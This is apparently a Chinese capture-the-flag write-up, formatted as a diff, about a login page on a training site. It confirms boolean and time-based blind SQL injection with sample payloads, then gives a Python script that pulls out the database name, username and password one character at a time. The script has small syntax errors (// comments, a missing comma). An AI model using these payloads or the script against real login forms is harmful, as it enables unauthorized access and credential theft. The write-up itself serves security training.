@@ -1,0 +1,57 @@
+手工测试的时候发现过滤了select，
+然后扔进sqlmap，发现不行。
+所以在测试
+admin=admin' and 1=1 and ''='
+&password=
+&action=login
+的时候出现“登录失败,错误的用户名和密码”， 其他的话出现，”连接数据库失败“的字样。
+
+并且在测试
+
+admin=admin' and sleep(10) and ''='
+&password=
+&action=login
+
+的时候，延迟了，所以存在基于布尔型，和基于时间的盲注。于是索性写脚本自己跑。
+
+Python脚本如下：
+
+#coding:utf-8
+
+#author:ch3rry
+
+import httplib
+import time
+import sys
+
+payloads = list('1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@')
+
+database = ''
+
+a = '登录失败'
+
+headers = {
+			'Host': 'ctf5.shiyanbar.com',
+			'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
+			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+			'Accept-Language': 'en-US,en;q=0.5',
+			'Accept-Encoding': 'gzip, deflate',
+			'Cookie': 'xxxxxxxx'   //填自己的cookies
+			'Connection': 'keep-alive',
+			'Upgrade-Insecure-Requests': '1'
+}
+print 'Start to retrive the Mysql database() || username || password:'
+for i in range(1,15):
+	for payload in payloads:
+		#urls = "/basic/inject/index.php?admin=admin'+and+substr(database(),%s,1)='%s'+and+''='&pass=&action=login" %(i,payload)   //database
+		#urls = "/basic/inject/index.php?admin=admin'+and+substr(username,%s,1)='%s'+and+''='&pass=&action=login" %(i,payload)		//username
+		urls = "/basic/inject/index.php?admin=admin'+and+substr(password,%s,1)='%s'+and+''='&pass=&action=login" %(i,payload)
+		conn = httplib.HTTPConnection('ctf5.shiyanbar.com',timeout=10)
+		conn.request(method='GET',url=urls,headers=headers)
+		r = conn.getresponse().read().decode('gb2312')
+		print '*',
+		if a.decode('utf-8') in r:
+			database +=payload
+			sys.stdout.write('\n[+]'+ database)
+			break
+print '\n[Done] database is : '+database
